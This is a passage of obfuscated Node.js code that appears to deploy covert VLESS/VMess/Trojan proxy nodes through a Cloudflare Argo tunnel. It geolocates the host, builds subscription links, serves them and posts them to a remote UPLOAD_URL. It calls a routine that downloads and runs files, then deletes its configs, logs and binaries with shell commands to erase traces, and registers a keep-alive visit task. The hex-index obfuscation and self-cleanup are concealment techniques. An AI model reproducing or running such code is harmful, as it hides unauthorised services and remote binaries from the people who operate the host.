axios[_0x3ebda4(0x184)](_0x3ebda4(_0x2ed1ab._0x2933ff),{'timeout':0xbb8});if(_0x5269c3[_0x3ebda4(0x174)]&&_0x5269c3[_0x3ebda4(_0x2ed1ab._0x367e1e)][_0x3ebda4(_0x2ed1ab._0x1b8569)]===_0x3ebda4(_0x2ed1ab._0x270f10)&&_0x5269c3[_0x3ebda4(0x174)]['countryCode']&&_0x5269c3[_0x3ebda4(_0x2ed1ab._0x5ee614)][_0x3ebda4(_0x2ed1ab._0x2aaeed)])return _0x5269c3[_0x3ebda4(_0x2ed1ab._0x4128ed)][_0x3ebda4(_0x2ed1ab._0x36c835)]+'_'+_0x5269c3['data'][_0x3ebda4(0x1b3)];}catch(_0x10211c){}}return'Unknown';}async function _0x4db20e(_0x3b4771){const _0x1ce96c=await _0x516db8(),_0x6aedc0=NAME?NAME+'-'+_0x1ce96c:_0x1ce96c;return new Promise(_0x50646a=>{const _0x12b129={_0x380546:0x180,_0x27374b:0x209,_0xad4511:0x22c,_0x367f44:0x21a,_0x46639f:0x17e,_0x530c02:0x21e,_0x284d50:0x1eb,_0x1c0e5c:0x1aa,_0x228ed7:0x18e,_0x32c861:0x21a,_0x70b1a6:0x1f3},_0xba1878={_0x532460:0x21a,_0xd03579:0x18e,_0x4e1ada:0x1d8};setTimeout(()=>{const _0x26bbee=_0x9d36,_0x57adac={'v':'2','ps':''+_0x6aedc0,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x26bbee(0x175),'host':_0x3b4771,'path':_0x26bbee(_0x12b129._0x380546),'tls':_0x26bbee(0x219),'sni':_0x3b4771,'alpn':'','fp':'firefox'},_0x460e37=_0x26bbee(_0x12b129._0x27374b)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x3b4771+_0x26bbee(0x1cf)+_0x3b4771+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x6aedc0+_0x26bbee(_0x12b129._0xad4511)+Buffer[_0x26bbee(_0x12b129._0x367f44)](JSON[_0x26bbee(_0x12b129._0x46639f)](_0x57adac))['toString'](_0x26bbee(0x18e))+_0x26bbee(_0x12b129._0x530c02)+UUID+'@'+CFIP+':'+CFPORT+_0x26bbee(0x223)+_0x3b4771+'&fp=firefox&type=ws&host='+_0x3b4771+_0x26bbee(0x222)+_0x6aedc0+_0x26bbee(0x1e1);console[_0x26bbee(_0x12b129._0x284d50)](Buffer[_0x26bbee(0x21a)](_0x460e37)[_0x26bbee(_0x12b129._0x1c0e5c)](_0x26bbee(_0x12b129._0x228ed7))),fs[_0x26bbee(0x1ed)](subPath,Buffer[_0x26bbee(_0x12b129._0x32c861)](_0x460e37)[_0x26bbee(0x1aa)](_0x26bbee(0x18e))),console['log'](FILE_PATH+_0x26bbee(_0x12b129._0x70b1a6)),uploadNodes(),app[_0x26bbee(0x184)]('/'+SUB_PATH,(_0x4dae30,_0x318522)=>{const _0x233bf0=_0x26bbee,_0x701e22=Buffer[_0x233bf0(_0xba1878._0x532460)](_0x460e37)[_0x233bf0(0x1aa)](_0x233bf0(_0xba1878._0xd03579));_0x318522[_0x233bf0(0x193)]('Content-Type',_0x233bf0(_0xba1878._0x4e1ada)),_0x318522['send'](_0x701e22);}),_0x50646a(_0x460e37);},0x7d0);});}}async function uploadNodes(){const _0x2ec64d={_0x479dfe:0x185,_0x53712b:0x1e3,_0x4a54b9:0x1b8,_0x1a18c8:0x187,_0x660e51:0x1ad,_0x202a9e:0x186},_0x5dfb20=_0x28c643;if(UPLOAD_URL&&PROJECT_URL){const _0x5be32e=PROJECT_URL+'/'+SUB_PATH,_0x69369b={'subscription':[_0x5be32e]};try{const _0x3a4ae6=await axios[_0x5dfb20(0x189)](UPLOAD_URL+'/api/add-subscriptions',_0x69369b,{'headers':{'Content-Type':'application/json'}});return _0x3a4ae6&&_0x3a4ae6['status']===0xc8?(console['log']('Subscription\x20uploaded\x20successfully'),_0x3a4ae6):null;}catch(_0x23dcd1){if(_0x23dcd1[_0x5dfb20(_0x2ec64d._0x479dfe)]){if(_0x23dcd1[_0x5dfb20(0x185)][_0x5dfb20(0x1ad)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x5dfb20(0x1a2)](listPath))return;const _0x34561f=fs[_0x5dfb20(_0x2ec64d._0x53712b)](listPath,_0x5dfb20(0x1fe)),_0x4b1210=_0x34561f[_0x5dfb20(_0x2ec64d._0x4a54b9)]('\x0a')['filter'](_0x536e83=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x536e83));if(_0x4b1210[_0x5dfb20(0x1e4)]===0x0)return;const _0x5c6bf2=JSON[_0x5dfb20(0x17e)]({'nodes':_0x4b1210});try{const _0x5a93cb=await axios['post'](UPLOAD_URL+_0x5dfb20(_0x2ec64d._0x1a18c8),_0x5c6bf2,{'headers':{'Content-Type':'application/json'}});return _0x5a93cb&&_0x5a93cb[_0x5dfb20(_0x2ec64d._0x660e51)]===0xc8?(console[_0x5dfb20(0x1eb)](_0x5dfb20(_0x2ec64d._0x202a9e)),_0x5a93cb):null;}catch(_0x54aa83){return null;}}else return;}}function cleanFiles(){const _0x4c7fa4={_0x6d1cca:0x22d,_0x5347cf:0x1ea,_0x53bde5:0x1e8,_0x20826f:0x1ea,_0x14268c:0x1c4};setTimeout(()=>{const _0x368015={_0x3eeffb:0x1c3,_0x90c77e:0x1eb},_0x22afab=_0x9d36,_0x4ded2e=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4ded2e[_0x22afab(0x220)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4ded2e['push'](phpPath);process[_0x22afab(_0x4c7fa4._0x6d1cca)]===_0x22afab(0x212)?exec(_0x22afab(0x1a1)+_0x4ded2e[_0x22afab(_0x4c7fa4._0x5347cf)]('\x20')+_0x22afab(0x18a),_0x106dfd=>{const _0x580f4c=_0x22afab;console[_0x580f4c(0x228)](),console[_0x580f4c(0x1eb)](_0x580f4c(0x1c3)),console[_0x580f4c(0x1eb)](_0x580f4c(0x1a3));}):exec(_0x22afab(_0x4c7fa4._0x53bde5)+_0x4ded2e[_0x22afab(_0x4c7fa4._0x20826f)]('\x20')+_0x22afab(_0x4c7fa4._0x14268c),_0x1290cb=>{const _0x454226=_0x22afab;console[_0x454226(0x228)](),console[_0x454226(0x1eb)](_0x454226(_0x368015._0x3eeffb)),console[_0x454226(_0x368015._0x90c77e)](_0x454226(0x1a3));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x79017b={_0x1af27d:0x189,_0xd9232e:0x206,_0xf28540:0x1ca,_0x33abc4:0x177},_0x40b90d=_0x28c643;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x40b90d(0x1eb)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x43c75e=await axios[_0x40b90d(_0x79017b._0x1af27d)](_0x40b90d(_0x79017b._0xd9232e),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x40b90d(0x1eb)]('automatic\x20access\x20task\x20added\x20successfully'),_0x43c75e;}catch(_0xc762b3){return console[_0x40b90d(_0x79017b._0xf28540)](_0x40b90d(0x18f)+_0xc762b3[_0x40b90d(_0x79017b._0x33abc4)]),null;}}async function startserver(){const _0x5d8df5={_0x945369:0x188},_0x17d13f=_0x28c643;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x88dea6){console[_0x17d13f(0x1ca)](_0x17d13f(_0x5d8df5._0x945369),_0x88dea6);}}startserver()[_0x28c643(0x226)](_0x311cee=>{const _0x1d3316={_0x22873b:0x1ca},_0x556665=_0x28c643;console[_0x556665(_0x1d3316._0x22873b)]('Unhandled\x20error\x20in\x20startserver:',_0x311cee);}),app[_0x28c643(0x20e)](PORT,()=>console['log'](_0x28c643(0x19b)+PORT+'!'));
